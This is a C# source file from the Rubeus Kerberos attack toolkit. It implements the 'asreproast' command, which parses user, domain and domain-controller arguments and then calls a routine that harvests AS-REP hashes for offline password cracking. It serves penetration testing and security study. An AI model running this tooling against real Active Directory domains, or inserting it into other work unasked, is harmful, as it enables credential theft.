using System;
using System.Collections.Generic;

namespace Rubeus.Commands
{
    public class Asreproast : ICommand
    {
        public static string CommandName => "asreproast";

        public void Execute(Dictionary<string, string> arguments)
        {
            string user = "";
            string domain = "";
            string dc = "";
            string format = "john";
            string compositeUserName;

            // TODO : Clarify in original source code.
            if (arguments.TryGetValue("/user", out compositeUserName)) {
                string[] parts = compositeUserName.Split('\\');
                switch (parts.Length) {
                    case 2:
                        domain = parts[0];
                        user = parts[1];
                        break;
                    case 1:
                        user = compositeUserName;
                        break;
                    default:
                        throw new ApplicationException();
                }
            }
            if (string.IsNullOrEmpty(domain)) {
                // Because we don't want to override the value from the /user parameter unless it is not
                // explictly stated in the /user argument.
                arguments.TryGetValue("/domain", out domain);
            }
            arguments.TryGetValue("/dc", out dc);
            arguments.TryGetValue("/format", out format);
            if (string.IsNullOrEmpty(user)) {
                Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
                return;
            }
            if (string.IsNullOrEmpty(domain)) {
                domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            Roast.ASRepRoast(user, domain, string.IsNullOrEmpty(dc) ? string.Empty : dc, format);
        }
    }
}